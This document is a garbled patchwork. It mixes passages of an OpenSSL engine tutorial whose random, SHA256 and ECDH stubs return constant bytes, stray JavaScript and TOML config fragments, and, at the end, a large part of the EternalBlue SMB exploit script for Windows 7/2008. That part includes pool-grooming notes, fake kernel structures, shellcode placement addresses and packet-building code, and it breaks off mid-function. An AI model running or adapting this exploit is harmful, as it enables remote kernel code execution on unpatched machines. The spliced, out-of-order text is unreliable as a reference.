   ECDSA_METHOD_set_verify(oezgan_engine_ecdsa_method, oezgan_engine_ecdsa_do_verify);
return 1;
} +and then in the bind_helper we have to do something like this:
int bind_helper(ENGINE * e, const char *id)
{
   if (!ENGINE_set_id(e, engine_oezgan_id) ||
           !ENGINE_set_name(e, engine_oezgan_name) ||
  !setup_ecdsa_method() ||
           !ENGINE_set_ECDSA(e, oezgan_engine_ecdsa_method)
   )
       return 0;
   return 1;
} +This is probably the smoother way to go. +Using C++ Implementations
+In our engine implementation of random generation, sha256, ECDH and ECDSA we used strict C methods. In practice however it is easier to implement elliptic curve functionality in C++; at least this is the author’s perception. Let’s assume that we have some elliptic curve and sha256 implementation in C++. How can we use this implementation as an engine in OpenSSL? Consider the following diagram. +Wrapper.png +The engine is implemented in pure C; the wrapper which is kind of an interface to the C++ implementation is also implemented in C++. The header of the wrapper provides the engine with the necessary methods to be called; these are declared as extern c functions and have a C method signature. The actual implementations of these extern C functions can include C++ syntax and types. From these functions we use the C++ implementation of the elliptic curve libraries. The wrapper should be compiled a static library together with the elliptic curve C++ implementation. +The engine is implemented in pure C; the wrapper which is kind of an interface to the C++ implementation is also implemented in C++. The header of the wrapper provides the engine with the necessary methods to be called; these are declared as extern c functions and have a C method signature. The actual implementations of these extern C functions can include C++ syntax and types. From these functions we use the C++ implementation of the elliptic curve libraries. The wrapper should be compiled a static library together with the elliptic curve C++ implementation. Here is a simple with the random function. The wrapper.h file: +#ifndef WRAPPER_H_ +#define WRAPPER_H_ + + +#ifdef __cplusplus +extern "C" +{ +#endif

extern void getRandomBytes_C(unsigned char* buffer, int length); +#ifdef __cplusplus +}
+#endif +#endif /* WRAPPER_H_ / + +And the wrapper.c file: +#include <stdio.h> +#include <string.h> +#include +#include +#include +#include "wrapper.h" + + +using namespace std; +typedef unsigned char byte; +typedef std::vector ByteVector; + +void getRandomBytes_C(unsigned char buffer, int numBytes) {

string str = "oezgan engine wrapper getRandomBytes C++ method";
cout << str << "\n";
string fileName = "/dev/urandom";
ByteVector result;
std::ifstream inFile(fileName.c_str());
std::filebuf* fileBuf = inFile.rdbuf();
result.resize(numBytes);
fileBuf->sgetn(reinterpret_cast<char*>(&result[0]), numBytes);
inFile.close();
memcpy(buffer,&result[0],numBytes);
+} +When we modify the Engine.c file as: +//new include +#include "wrapper.h" + +int get_random_bytes(unsigned char *buf, int num) {

printf("oezgan engine random length %d\n", num);
getRandomBytes_C(buf, num);
return 99; +} +Note that the engine should be compiled with the +-Wl,-whole-archive -lwrapper -Wl,-no-whole-archive +linker flag, such that the wrapper is completely included in the engine. In eclipse you can define an environment variable for that. +To add the whole archive flag in eclipse you can go to +Project->Properties->C/C++ Build->Enviroment +And add a new environment variable WHOLELIB with the value: +-Wl,-whole-archive -lwrapper -Wl,-no-whole-archive +After that, go to:
+Project->Properties->C/C++ Build->Setting->Tool Settings-> GCC C Linker +and add under expert settings at the end of the command line pattern (with an empty space between) ./oezganEngineTester +Oezgan Engine successfully loaded +Oezgan Engine Initializatzion! +Engine name: oezgan engine by Fraunhofer FKIE init result : 786 +oezgan engine random length 5 +oezgan engine wrapper getRandomBytes C++ method +dea695abdf +… +As you can see the C++ random generation method is used, for other methods you can use a similar approach.

document.querySelector("#find-me").addEventListener("click", geoFindMe);

@@ -27007,4 +27778,4 @@ then the validating party should refuse to accept the certificate. Custom options should append the originating author or organisation's domain name to the option name, e.g. "my-option artifact_paths = ["{repo}/design"]

exclude_artifact_paths = []

code_paths = [ "/artifact-app/src", "/artifact-app/tests", "/artifact-lib/src", "/artifact-ser/src", "/artifact-data/src", "/artifact-test/src", "/artifact-frontend/src", ]

exclude_code_paths = [ ]

code_url = "https://github.com/vitiral/artifact/blob/master/{file}#L{line}"

[export] md_header = """ Artifact design docs, exported to markdown.

See REQ-purpose for the top level artifact.

Note: Export docs like this with art export md exported.md

Settings are in .art/settings.toml """ md_family = { type = "list" }
[export.md_dot] type = "ignore"

pre = """

Alt text



custom_mark10

"""

post = """

custom_mark10

"""

sudo ln –s ~/workspace/oezganEngine/Debug/liboezganengine.so liboezgan.so You can also copy the compiled shared library into the /usr/lib/engines/ directory but this should be done when the engine is ready to be deployed.You can find the OpenSSL include files in /usr/include/openssl. Beginning

We will start with implementing an engine which only has its name and nothing else. The oezganEngine.c file: #include <openssl/engine.h> static const char *engine_oezgan_id = "oezgan"; static const char *engine_oezgan_name = "oezgan engine by Fraunhofer FKIE";

IMPLEMENT_DYNAMIC_CHECK_FN(); IMPLEMENT_DYNAMIC_BIND_FN(bind_helper);

int oezgan_init(ENGINE *e) { printf("Oezgan Engine Initializatzion!\n"); return 786; }

int bind_helper(ENGINE * e, const char *id) { if (!ENGINE_set_id(e, engine_oezgan_id) || !ENGINE_set_name(e, engine_oezgan_name) || !ENGINE_set_init_function(e,oezgan_init) ) return 0;

return 1;
}

and the tester oezganEngineTester.cc file: #include <openssl/engine.h> #include <stdio.h> #include <string.h>

int main(int argc, const char* argv[] ) { OpenSSL_add_all_algorithms();

ERR_load_crypto_strings();

ENGINE_load_dynamic();
ENGINE *oezgan_engine = ENGINE_by_id("oezgan");

if( oezgan_engine == NULL )
{
    printf("Could not Load Oezgan Engine!\n");
    exit(1);
}
printf("Oezgan Engine successfully loaded\n");

int init_res = ENGINE_init(oezgan_engine);
printf("Engine name: %s init result : %d \n",ENGINE_get_name(oezgan_engine), init_res);
return 0;
}

Note that we use a c++ file to test the engine. Running the tester gives us the following result: oezgan@kehf-dev1:~/workspace3/oezganEngineTester/Debug$ ./oezganEngineTester Oezgan Engine successfully loaded Oezgan Engine Initializatzion! Engine name: oezgan engine by Fraunhofer FKIE init result : 786 Our engine is successfully loaded and when it`s asked it gives back its name. Now we proceed by implementing our own random function. Cleanup memory leaks For OpenSSL version prior to 1.1.0, users are required to call ENGINE_cleanup, EVP_cleanup, etc. to prevent memory leak. See Library Initialization page. For OpenSSL version 1.1.0 and 1.1.1, cleanup happens automatically, users should not worry about it. ENGINE_set_finish_function & ENGINE_set_destroy_function are still available to do implementation specific cleanup. The Random Function

OpenSSL has its own method declarations which our engine has to comply with. In the header file ossl_typ.h we find the declaration s: typedef struct rand_meth_st RAND_METHOD; typedef struct ecdh_method ECDH_METHOD; typedef struct ecdsa_method ECDSA_METHOD; For now we are only interested in the RAND_METHOD declaration. The RAND_METHOD declaration is actually a macro for the rand_method_st declaration which can be found in rand.h of the OpenSSL includes. Here we see that the rand_method_st has the following format: struct rand_meth_st { void (*seed) (const void *buf, int num); int (*bytes) (unsigned char *buf, int num); void (*cleanup) (void); void (*add) (const void *buf, int num, double entropy); int (*pseudorand) (unsigned char *buf, int num); int (*status) (void); }; Thus we see that the OpenSSL random method structure defines six functions where the headers of these functions have specific formats. For simplicity purposes we will only implement the “bytes” and the “status” methods. The status method should return an integer and takes no arguments. Presumably this method is used for indication of the state of the random machine. Our engine`s random machine has no states, therefore we only return a positive integer to indicate a thumbs up state. The random status method: int oezgan_random_status(void) { return 1; } Now we implement our own method for generating a number of random bytes as follows: //new includes #include <string.h> #include <openssl/ossl_typ.h>

int get_random_bytes(unsigned char buffer, int num) { printf("oezgan engine random length %d\n", num); memset(buffer,1,num); return 99; } This method will fill the given buffer with num many ones. Now we indicate our random machine structure as: RAND_METHOD oezgan_random_method = { NULL, / seed / get_random_bytes, NULL, / cleanup / NULL, / add */ NULL, oezgan_random_status }; We also modify the bind_helper function from above: int bind_helper(ENGINE * e, const char *id) { if (!ENGINE_set_id(e, engine_oezgan_id) || !ENGINE_set_name(e, engine_oezgan_name) || !ENGINE_set_init_function(e, oezgan_init) || !ENGINE_set_RAND(e, &oezgan_random_method) ) return 0; return 1; } In the tester we add the following lines: ENGINE_set_default_RAND(oezgan_engine);

unsigned char * rand_buf= new unsigned char[5]; int err = RAND_bytes(rand_buf,5); for(int i= 0; i < 5; i++) { printf("%x",rand_buf[i]); } printf("\n"); free(rand_buf); The result is seen below: oezgan@kehf-dev1:~/workspace3/oezganEngineTester/Debug$ ./oezganEngineTester Oezgan Engine successfully loaded Oezgan Engine Initializatzion! Engine name: oezgan engine by Fraunhofer FKIE init result : 786 oezgan engine random length 5 11111 We now successfully implemented an OpenSSL engine that gives always returns a lot of 1s as random values. Digests

Now we want OpenSSL not only to use our own random function but also to use our sha2 family hash functions. We first implement a digest selector function, which tells OpenSSL which digests are available in our engine. This kind of implementation is adapted from the OpenSSL`s build-in engine ccghost. We will implement only one hash function namely SHA256. Following the the ossl_typ.h header to the evp.h header one can see that the Message Digest Structure is defined as follows: struct env_md_st { int type; int pkey_type; int md_size; unsigned long flags; int (*init) (EVP_MD_CTX *ctx); int (*update) (EVP_MD_CTX *ctx, const void *data, size_t count); int (*final) (EVP_MD_CTX *ctx, unsigned char *md); int (*copy) (EVP_MD_CTX *to, const EVP_MD_CTX *from); int (*cleanup) (EVP_MD_CTX ctx); / FIXME: prototype these some day */ int (*sign) (int type, const unsigned char *m, unsigned int m_length, unsigned char *sigret, unsigned int *siglen, void *key); int (*verify) (int type, const unsigned char *m, unsigned int m_length, const unsigned char *sigbuf, unsigned int siglen, void key); int required_pkey_type[5]; / EVP_PKEY_xxx / int block_size; int ctx_size; / how big does the ctx->md_data need to be / / control function */ int (*md_ctrl) (EVP_MD_CTX *ctx, int cmd, int p1, void p2); } / EVP_MD / ; (Commentaries are original form OpenSSL code). From this we use our own message digest hash SHA256 declaration: static EVP_MD oezgan_engine_sha256_method= { NID_sha256, NID_undef, 32, EVP_MD_FLAG_PKEY_METHOD_SIGNATURE, oezgan_engine_sha256_init, oezgan_engine_sha256_update, oezgan_engine_sha256_final, oezgan_engine_sha256_copy, oezgan_engine_sha256_cleanup, / FIXME: prototype these some day / NULL, NULL, {NID_undef, NID_undef, 0, 0, 0}, 64, /Block Size/ 32, / how big does the ctx->md_data need to be / / control function / NULL, } ; SHA256 uses a block size of 512 Bit = 64 byte and resulting digest is 256 Bit = 32 byte long. You can also use your own block size and outcome size but for a realistic approach we stick to the original sha256 standard. Now we need to implement the init, update, final and copy functions for our own sha256 implementation. In our implementation the SHA256 Value is always 2222… Note Since 1.1.0, EVP_MD cannot be directly accessed. Users have to call EVP_MD_meth_new to get EVP_MD instance, and use EVP_MD_meth_set_ to set functions and properties list above. OID and NID In above example, we reused sha256's nid. For those who want to implement new algorithms, use OBJ_create to create new nid and OBJ_*2nid to translate names to nids. static int oezgan_engine_sha256_init(EVP_MD_CTX *ctx) { ctx->update = &oezgan_engine_sha256_update; printf("initialized! SHA256\n"); return 1; }

static int oezgan_engine_sha256_update(EVP_MD_CTX *ctx,const void data,size_t count) { printf("SHA256 update \n"); unsigned char * digest256 = (unsigned char) malloc(sizeof(unsigned char)*32); memset(digest256,2,32); count = 32; ctx->md_data = digest256; return 1; }

static int oezgan_engine_sha256_final(EVP_MD_CTX *ctx,unsigned char md) { printf("SHA256 final size of EVP_MD: %d\n", sizeof(EVP_MD)); memcpy(md,(unsigned char)ctx->md_data,32); return 1; }

int oezgan_engine_sha256_copy(EVP_MD_CTX *to, const EVP_MD_CTX *from) { printf("Copy SHA256\n"); if (to->md_data && from->md_data) { memcpy(to->md_data, from->md_data,sizeof(from->md_data)); } return 1; }

static int oezgan_engine_sha256_cleanup(EVP_MD_CTX *ctx) { printf("SHA256 cleanup\n"); if (ctx->md_data) memset(ctx->md_data, 0, 32); return 1; } Now we have to tell OpenSSL that whenever a SHA256 digest is requested use the engine implementation of sha256 this will be the digest selector function. static int oezgan_digest_ids[] = {NID_sha256};

static int oezgan_engine_digest_selector(ENGINE *e, const EVP_MD **digest, const int **nids, int nid) { int ok = 1; if (!digest) { *nids = oezgan_digest_ids; printf("\n Digest is empty! Nid:%d\n", nid); return 2; } printf("Digest no %d requested\n",nid); if (nid == NID_sha256) { *digest = &oezgan_engine_sha256_method; } else { ok = 0; *digest = NULL; } return ok; } We also need to modify the bind_helper function again: int bind_helper(ENGINE * e, const char *id) { if (!ENGINE_set_id(e, engine_oezgan_id) || !ENGINE_set_name(e, engine_oezgan_name) || !ENGINE_set_RAND(e, &oezgan_random_method) || !ENGINE_set_init_function(e, oezgan_init) || !ENGINE_set_digests(e, &oezgan_engine_digest_selector) ) return 0; return 1; } And we modify our tester to generate us a SHA256 Hash function. char * str = "Fraunhofer FKIE Wachtberg!"; int str_len = 26; int er = ENGINE_set_default_digests(oezgan_engine); printf("ENGINE SETTING DEFAULT DIGESTS %d\n",er);

unsigned char * digest = new unsigned char[32];
unsigned int digestSize = -1;

EVP_MD_CTX *evp_ctx;
evp_ctx = EVP_MD_CTX_create();
er = EVP_DigestInit_ex(evp_ctx, EVP_sha256(),oezgan_engine);
printf("Digest INIT %d\n",er);
er = EVP_DigestUpdate(evp_ctx, (unsigned char*)str, str_len);
printf("Digest Update %d\n",er);
er = EVP_DigestFinal(evp_ctx, digest, &digestSize);
printf("Digest Final %d Digest size:%d\n",er,digestSize);
for(int i= 0; i< digestSize; i++) {
    printf("%x", digest[i]);
}
printf("\n");
EVP_MD_CTX_destroy(evp_ctx);
The result is: oezgan@kehf-dev1:~/workspace3/oezganEngineTester/Debug$ ./oezganEngineTester Oezgan Engine successfully loaded Oezgan Engine Initializatzion! Engine name: oezgan engine by Fraunhofer FKIE init result : 786 oezgan engine random length 5 11111 ENGINE SETTING DEFAULT DIGESTS 1 initialized! SHA256 Digest INIT 1 SHA256 update Digest Update 1 SHA256 final size of EVP_MD: 76 SHA256 cleanup Digest Final 1 Digest size:32 22222222222222222222222222222222 Similarly one can also implement other digest functions. Now we move on to more complicated things like the ECDSA or the ECDH algorithms. ECDH

We now want to use our own Elliptic Curve Diffie-Hellman Key Agreement function. This is a little bit different from what we have seen above. We get us the definition of the ECDH method structe from the file crypto/ecdh/ecdh.h the definition which is provided in this file is not included in the OpenSSL headers, therefore we have to put it in a new header file which will be included in our engine. The file oezganEngine.h: #ifndef OEZGANENGINE_H_ #define OEZGANENGINE_H_ #ifdef __cplusplus extern "C" { #endif

struct ecdh_method { const char *name; int (*compute_key) (void *key, size_t outlen, const EC_POINT *pub_key, EC_KEY *ecdh, void *(*KDF) (const void *in, size_t inlen, void *out, size_t *outlen));

if 0

int (*init) (EC_KEY *eckey);
int (*finish) (EC_KEY *eckey);
endif

int flags;
char *app_data;
};

#ifdef __cplusplus } #endif

#endif /* OEZGANENGINE_H_ */ KDF is the Key Derivation Function which will be NULL here. Now we add the following declaration in to our oezganEngine.c file: ECDH_METHOD oezgan_ecdh_method = { "Oezgan Engine ECDH Method", oezgan_engine_compute_ecdh_key,

if 0

    NULL,
    NULL,
endif

    0,
    NULL,
}; And the implementation of the ECDH method: static int oezgan_engine_compute_ecdh_key(void * key, size_t outlen, const EC_POINT *pubkey, EC_KEY *eckey, void *(*oezgan_ecdh_kdf) (const void *in, size_t inlen, void *out, size_t *outlen)) { printf("Oezgan Engine ECDH Method\n");

EC_GROUP *group = EC_KEY_get0_group(eckey);
//convert pubkey
int pubkey_len = EC_POINT_point2oct(group, pubkey,
                        POINT_CONVERSION_UNCOMPRESSED,
                          NULL, 0, NULL);
unsigned char * pubkey_buf = malloc(sizeof(unsigned char)*pubkey_len);
pubkey_len = EC_POINT_point2oct(group, pubkey,
                        POINT_CONVERSION_UNCOMPRESSED,
                         pubkey_buf, pubkey_len, NULL);

//convert private key
const BIGNUM* prikey_bn = BN_new();
prikey_bn = EC_KEY_get0_private_key(eckey);
int privkey_len =  BN_num_bytes(prikey_bn);
unsigned char * privkey_buf = malloc(sizeof(unsigned char)*privkey_len);
BN_bn2bin(prikey_bn, privkey_buf);

memset(key,3,pubkey_len);
outlen = pubkey_len;	

free(privkey_buf);
free(pubkey_buf);

printf("Oezgan engine ECDH method End returning: %d!\n", outlen);

return outlen;
} Our implementation of the ECDH Method copies the public key into an unsigned char array pubkey also the private key is converted into an unsigned char array for demonstration purposes since a real ECDH implementation has to calculate the from the values bP = B and aP=A the value abP where a and b are the secret keys of two users Aylin and Boris respectively and P is the base point on the elliptic curve. Again we modify our bind_helper method as follows: int bind_helper(ENGINE * e, const char *id) { if (!ENGINE_set_id(e, engine_oezgan_id) || !ENGINE_set_name(e, engine_oezgan_name) || !ENGINE_set_RAND(e, &oezgan_random_method) || !ENGINE_set_init_function(e, oezgan_init) || !ENGINE_set_digests(e, &oezgan_engine_digest_selector) || !ENGINE_set_ECDH(e, &oezgan_engine_ecdh_method) ) return 0; return 1; } To be able to test this we need a certificate file and the corresponding private key file. There are many guides in the internet how to generate such certificates and private key pairs. Later on we will need that certificate file to test our ECDSA methods. The test program will now read in a private key file “ownPrivkey.pem” and try to establish an ECDH key with its own public key. The result will be a lot of 3s, exactly as many as the length of the public key. In our certificate file we use a brainpoolP384r1 curve as well as for the ECDH. Beware that the brainpool curves are not supported i


#!/usr/bin/python
from impacket import smb
from struct import pack
import sys
import socket

'''
EternalBlue exploit for Windows 7/2008 by sleepya
The exploit might FAIL and CRASH a target system (depended on what is overwritten)

Tested on:
- Windows 7 SP1 x64
- Windows 2008 R2 SP1 x64
- Windows 7 SP1 x86
- Windows 2008 SP1 x64
- Windows 2008 SP1 x86

Reference:
- http://blogs.360.cn/360safe/2017/04/17/nsa-eternalblue-smb/


Bug detail:
- For the buffer overflow bug detail, please see http://blogs.360.cn/360safe/2017/04/17/nsa-eternalblue-smb/
- The exploit also use other 2 bugs (see details in BUG.txt)
  - Send a large transaction with SMB_COM_NT_TRANSACT but processed as SMB_COM_TRANSACTION2 (requires for trigger bug)
  - Send special session setup command (SMB login command) to allocate big nonpaged pool (use for creating hole)
######


Exploit info:
- I do not reverse engineer any x86 binary so I do not know about exact offset.
- The exploit use heap of HAL (address 0xffffffffffd00010 on x64) for placing fake struct and shellcode.
  This memory page is executable on Windows 7 and Wndows 2008.
- The important part of feaList and fakeStruct is copied from NSA exploit which works on both x86 and x64.
- The exploit trick is same as NSA exploit
- The overflow is happened on nonpaged pool so we need to massage target nonpaged pool.
- If exploit failed but target does not crash, try increasing 'numGroomConn' value (at least 5)
- See the code and comment for exploit detail.


srvnet buffer info:
- srvnet buffer contains a pointer to another struct and MDL about received buffer
  - Controlling MDL values results in arbitrary write
  - Controlling pointer to fake struct results in code execution because there is pointer to function
- A srvnet buffer is created after target receiving first 4 bytes
  - First 4 bytes contains length of SMB message
  - The possible srvnet buffer size is "..., 0x9000, 0x11000, 0x21000, ...". srvnet.sys will select the size that big enough.
- After receiving whole SMB message or connection lost, server call SrvNetWskReceiveComplete() to handle SMB message
- SrvNetWskReceiveComplete() check and set some value then pass SMB message to SrvNetCommonReceiveHandler()
- SrvNetCommonReceiveHandler() passes SMB message to SMB handler
  - If a pointer in srvnet buffer is modified to fake struct, we can make SrvNetCommonReceiveHandler() call our shellcode
  - If SrvNetCommonReceiveHandler() call our shellcode, no SMB handler is called
  - Normally, SMB handler free the srvnet buffer when done but our shellcode dose not. So memory leak happen.
  - Memory leak is ok to be ignored


Shellcode note:
- Shellcode is executed in kernel mode (ring 0) and IRQL is DISPATCH_LEVEL
- Hijacking system call is common method for getting code execution in Process context (IRQL is PASSIVE_LEVEL)
  - On Windows x64, System call target address can be modified by writing to IA32_LSTAR MSR (0xc0000082)
  - IA32_LSTAR MSR scope is core/thread/unique depended on CPU model
  - On idle target with multiple core processors, the hijacked system call might take a while (> 5 minutes) to 
      get call because it is called on other processors
  - Shellcode should be aware of double overwriting system call target address when using hijacking system call method
- Then, using APC in Process context to get code execution in userland (ring 3)
'''

# Note: see how to craft FEALIST in eternalblue_poc.py

# wanted overflown buffer size (this exploit support only 0x10000 and 0x11000)
# the size 0x10000 is easier to debug when setting breakpoint in SrvOs2FeaToNt() because it is called only 2 time
# the size 0x11000 is used in nsa exploit. this size is more reliable.
NTFEA_SIZE = 0x11000
# the NTFEA_SIZE above is page size. We need to use most of last page preventing any data at the end of last page

ntfea10000 = pack('<BBH', 0, 0, 0xffdd) + 'A'*0xffde

ntfea11000 = (pack('<BBH', 0, 0, 0) + '\x00')*600  # with these fea, ntfea size is 0x1c20
ntfea11000 += pack('<BBH', 0, 0, 0xf3bd) + 'A'*0xf3be  # 0x10fe8 - 0x1c20 - 0xc = 0xf3bc

ntfea1f000 = (pack('<BBH', 0, 0, 0) + '\x00')*0x2494  # with these fea, ntfea size is 0x1b6f0
ntfea1f000 += pack('<BBH', 0, 0, 0x48ed) + 'A'*0x48ee  # 0x1ffe8 - 0x1b6f0 - 0xc = 0x48ec

ntfea = { 0x10000 : ntfea10000, 0x11000 : ntfea11000 }

'''
Reverse from srvnet.sys (Win7 x64)
- SrvNetAllocateNonPagedBufferInternal() and SrvNetWskReceiveComplete():

// for x64
struct SRVNET_BUFFER {
	// offset from POOLHDR: 0x10
	USHORT flag;
	char pad[2];
	char unknown0[12];
	// offset from SRVNET_POOLHDR: 0x20
	LIST_ENTRY list;
	// offset from SRVNET_POOLHDR: 0x30
	char *pnetBuffer;
	DWORD netbufSize;  // size of netBuffer
	DWORD ioStatusInfo;  // copy value of IRP.IOStatus.Information
	// offset from SRVNET_POOLHDR: 0x40
	MDL *pMdl1; // at offset 0x70
	DWORD nByteProcessed;
	DWORD pad3;
	// offset from SRVNET_POOLHDR: 0x50
	DWORD nbssSize;  // size of this smb packet (from user)
	DWORD pad4;
	QWORD pSrvNetWskStruct;  // want to change to fake struct address
	// offset from SRVNET_POOLHDR: 0x60
	MDL *pMdl2;
	QWORD unknown5;
	// offset from SRVNET_POOLHDR: 0x70
	// MDL mdl1;  // for this srvnetBuffer (so its pointer is srvnetBuffer address)
	// MDL mdl2;
	// char transportHeader[0x50];  // 0x50 is TRANSPORT_HEADER_SIZE
	// char netBuffer[0];
};

struct SRVNET_POOLHDR {
	DWORD size;
	char unknown[12];
	SRVNET_BUFFER hdr;
};
'''
# Most field in overwritten (corrupted) srvnet struct can be any value because it will be left without free (memory leak) after processing
# Here is the important fields on x64
# - offset 0x58 (VOID*) : pointer to a struct contained pointer to function. the pointer to function is called when done receiving SMB request.
#                           The value MUST point to valid (might be fake) struct.
# - offset 0x70 (MDL)   : MDL for describe receiving SMB request buffer
#   - 0x70 (VOID*)    : MDL.Next should be NULL
#   - 0x78 (USHORT)   : MDL.Size should be some value that not too small
#   - 0x7a (USHORT)   : MDL.MdlFlags should be 0x1004 (MDL_NETWORK_HEADER|MDL_SOURCE_IS_NONPAGED_POOL)
#   - 0x80 (VOID*)    : MDL.Process should be NULL
#   - 0x88 (VOID*)    : MDL.MappedSystemVa MUST be a received network buffer address. Controlling this value get arbitrary write.
#                         The address for arbitrary write MUST be subtracted by a number of sent bytes (0x80 in this exploit).
#                         
#
# To free the corrupted srvnet buffer, shellcode MUST modify some memory value to satisfy condition.
# Here is related field for freeing corrupted buffer
# - offset 0x10 (USHORT): be 0xffff to make SrvNetFreeBuffer() really free the buffer (else buffer is pushed to srvnet lookaside)
#                           a corrupted buffer MUST not be reused.
# - offset 0x48 (DWORD) : be a number of total byte received. This field MUST be set by shellcode because SrvNetWskReceiveComplete() set it to 0
#                           before calling SrvNetCommonReceiveHandler(). This is possible because pointer to SRVNET_BUFFER struct is passed to
#                           your shellcode as function argument
# - offset 0x60 (PMDL)  : points to any fake MDL with MDL.Flags 0x20 does not set
# The last condition is your shellcode MUST return non-negative value. The easiest way to do is "xor eax,eax" before "ret".
# Here is x64 assembly code for setting nByteProcessed field
# - fetch SRVNET_BUFFER address from function argument
#     \x48\x8b\x54\x24\x40  mov rdx, [rsp+0x40]
# - set nByteProcessed for trigger free after return
#     \x8b\x4a\x2c          mov ecx, [rdx+0x2c]
#     \x89\x4a\x38          mov [rdx+0x38], ecx

TARGET_HAL_HEAP_ADDR_x64 = 0xffffffffffd00010
TARGET_HAL_HEAP_ADDR_x86 = 0xffdff000

fakeSrvNetBufferNsa = pack('<II', 0x11000, 0)*2
fakeSrvNetBufferNsa += pack('<HHI', 0xffff, 0, 0)*2
fakeSrvNetBufferNsa += '\x00'*16
fakeSrvNetBufferNsa += pack('<IIII', TARGET_HAL_HEAP_ADDR_x86+0x100, 0, 0, TARGET_HAL_HEAP_ADDR_x86+0x20)
fakeSrvNetBufferNsa += pack('<IIHHI', TARGET_HAL_HEAP_ADDR_x86+0x100, 0, 0x60, 0x1004, 0)  # _, x86 MDL.Next, .Size, .MdlFlags, .Process
fakeSrvNetBufferNsa += pack('<IIQ', TARGET_HAL_HEAP_ADDR_x86-0x80, 0, TARGET_HAL_HEAP_ADDR_x64)  # x86 MDL.MappedSystemVa, _, x64 pointer to fake struct
fakeSrvNetBufferNsa += pack('<QQ', TARGET_HAL_HEAP_ADDR_x64+0x100, 0)  # x64 pmdl2
# below 0x20 bytes is overwritting MDL
# NSA exploit overwrite StartVa, ByteCount, ByteOffset fields but I think no need because ByteCount is always big enough
fakeSrvNetBufferNsa += pack('<QHHI', 0, 0x60, 0x1004, 0)  # MDL.Next, MDL.Size, MDL.MdlFlags
fakeSrvNetBufferNsa += pack('<QQ', 0, TARGET_HAL_HEAP_ADDR_x64-0x80)  # MDL.Process, MDL.MappedSystemVa

# below is for targeting x64 only (all x86 related values are set to 0)
# this is for show what fields need to be modified
fakeSrvNetBufferX64 = pack('<II', 0x11000, 0)*2
fakeSrvNetBufferX64 += pack('<HHIQ', 0xffff, 0, 0, 0)
fakeSrvNetBufferX64 += '\x00'*16
fakeSrvNetBufferX64 += '\x00'*16
fakeSrvNetBufferX64 += '\x00'*16  # 0x40
fakeSrvNetBufferX64 += pack('<IIQ', 0, 0, TARGET_HAL_HEAP_ADDR_x64)  # _, _, pointer to fake struct
fakeSrvNetBufferX64 += pack('<QQ', TARGET_HAL_HEAP_ADDR_x64+0x100, 0)  # pmdl2
fakeSrvNetBufferX64 += pack('<QHHI', 0, 0x60, 0x1004, 0)  # MDL.Next, MDL.Size, MDL.MdlFlags
fakeSrvNetBufferX64 += pack('<QQ', 0, TARGET_HAL_HEAP_ADDR_x64-0x80)  # MDL.Process, MDL.MappedSystemVa


fakeSrvNetBuffer = fakeSrvNetBufferNsa
#fakeSrvNetBuffer = fakeSrvNetBufferX64

feaList = pack('<I', 0x10000)  # the value of feaList size MUST be >=0x10000 to trigger bug (but must be less than data size)
feaList += ntfea[NTFEA_SIZE]
# Note:
# - SMB1 data buffer header is 16 bytes and 8 bytes on x64 and x86 respectively
#   - x64: below fea will be copy to offset 0x11000 of overflow buffer
#   - x86: below fea will be copy to offset 0x10ff8 of overflow buffer
feaList += pack('<BBH', 0, 0, len(fakeSrvNetBuffer)-1) + fakeSrvNetBuffer # -1 because first '\x00' is for name
# stop copying by invalid flag (can be any value except 0 and 0x80)
feaList += pack('<BBH', 0x12, 0x34, 0x5678)


# fake struct for SrvNetWskReceiveComplete() and SrvNetCommonReceiveHandler()
# x64: fake struct is at ffffffff ffd00010
#   offset 0xa0:  LIST_ENTRY must be valid address. cannot be NULL.
#   offset 0x08:  set to 3 (DWORD) for invoking ptr to function
#   offset 0x1d0: KSPIN_LOCK
#   offset 0x1d8: array of pointer to function
#
# code path to get code exection after this struct is controlled
# SrvNetWskReceiveComplete() -> SrvNetCommonReceiveHandler() -> call fn_ptr
fake_recv_struct = pack('<QII', 0, 3, 0)
fake_recv_struct += '\x00'*16
fake_recv_struct += pack('<QII', 0, 3, 0)
fake_recv_struct += ('\x00'*16)*7
fake_recv_struct += pack('<QQ', TARGET_HAL_HEAP_ADDR_x64+0xa0, TARGET_HAL_HEAP_ADDR_x64+0xa0)  # offset 0xa0 (LIST_ENTRY to itself)
fake_recv_struct += '\x00'*16
fake_recv_struct += pack('<IIQ', TARGET_HAL_HEAP_ADDR_x86+0xc0, TARGET_HAL_HEAP_ADDR_x86+0xc0, 0)  # x86 LIST_ENTRY
fake_recv_struct += ('\x00'*16)*11
fake_recv_struct += pack('<QII', 0, 0, TARGET_HAL_HEAP_ADDR_x86+0x190)  # fn_ptr array on x86
fake_recv_struct += pack('<IIQ', 0, TARGET_HAL_HEAP_ADDR_x86+0x1f0-1, 0)  # x86 shellcode address
fake_recv_struct += ('\x00'*16)*3
fake_recv_struct += pack('<QQ', 0, TARGET_HAL_HEAP_ADDR_x64+0x1e0)  # offset 0x1d0: KSPINLOCK, fn_ptr array
fake_recv_struct += pack('<QQ', 0, TARGET_HAL_HEAP_ADDR_x64+0x1f0-1)  # x64 shellcode address - 1 (this value will be increment by one)


def getNTStatus(self):
	return (self['ErrorCode'] << 16) | (self['_reserved'] << 8) | self['ErrorClass']
setattr(smb.NewSMBPacket, "getNTStatus", getNTStatus)

def sendEcho(conn, tid, data):
	pkt = smb.NewSMBPacket()
	pkt['Tid'] = tid

	transCommand = smb.SMBCommand(smb.SMB.SMB_COM_ECHO)
	transCommand['Parameters'] = smb.SMBEcho_Parameters()
	transCommand['Data'] = smb.SMBEcho_Data()

	transCommand['Parameters']['EchoCount'] = 1
	transCommand['Data']['Data'] = data
	pkt.addCommand(transCommand)

	conn.sendSMB(pkt)
	recvPkt = conn.recvSMB()
	if recvPkt.getNTStatus() == 0:
		print('got good ECHO response')
	else:
		print('got bad ECHO response: 0x{:x}'.format(recvPkt.getNTStatus()))


def createSessionAllocNonPaged(target, size):
	# There is a bug in SMB_COM_SESSION_SETUP_ANDX command that allow us to allocate a big nonpaged pool.
	# The big nonpaged pool allocation is in BlockingSessionSetupAndX() function for storing NativeOS and NativeLanMan.
	# The NativeOS and NativeLanMan size is caculated from "ByteCount - other_data_size"
	
	# Normally a server validate WordCount and ByteCount field in SrvValidateSmb() function. They must not be larger than received data. 
	# For "NT LM 0.12" dialect, There are 2 possible packet format for SMB_COM_SESSION_SETUP_ANDX command.
	# - https://msdn.microsoft.com/en-us/library/ee441849.aspx for LM and NTLM authentication
	#   - GetNtSecurityParameters() function is resposible for extracting data from this packet format
